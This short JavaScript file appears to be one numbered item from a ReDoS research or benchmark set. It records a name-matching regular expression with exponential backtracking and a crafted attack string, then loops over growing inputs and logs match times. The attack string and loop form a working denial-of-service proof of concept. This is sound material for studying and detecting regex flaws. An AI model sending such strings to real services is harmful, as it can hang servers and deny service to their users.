/* 1550
 * ((?!(This|It|He|She|[MTWFS][a-z]+day|[JF][a-z]+ary|March|April|May|June|July|August|[SOND][a-z]+ber))(?:[A-Z]+\.\s?)*(?:(?:[a-zA-Z]+-?)?[A-Z][a-zA-Z]+)(?:(\b\s?((?:[a-zA-Z]+-?)?[A-Z][a-zA-Z]+|[A-Z]+\.|on|of|the|von|der|van|de|bin|and))*(?:\s*(?:[a-zA-Z]+-?)?[A-Z][a-zA-Z]+))?)
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:"Aa"+"AA"*128+"! _1_EOA(iii)"
 */
var REGEX = /((?!(This|It|He|She|[MTWFS][a-z]+day|[JF][a-z]+ary|March|April|May|June|July|August|[SOND][a-z]+ber))(?:[A-Z]+\.\s?)*(?:(?:[a-zA-Z]+-?)?[A-Z][a-zA-Z]+)(?:(\b\s?((?:[a-zA-Z]+-?)?[A-Z][a-zA-Z]+|[A-Z]+\.|on|of|the|von|der|van|de|bin|and))*(?:\s*(?:[a-zA-Z]+-?)?[A-Z][a-zA-Z]+))?)/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = 'Aa' + 'AA'.repeat(i*1) + '! _1_EOA(iii)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}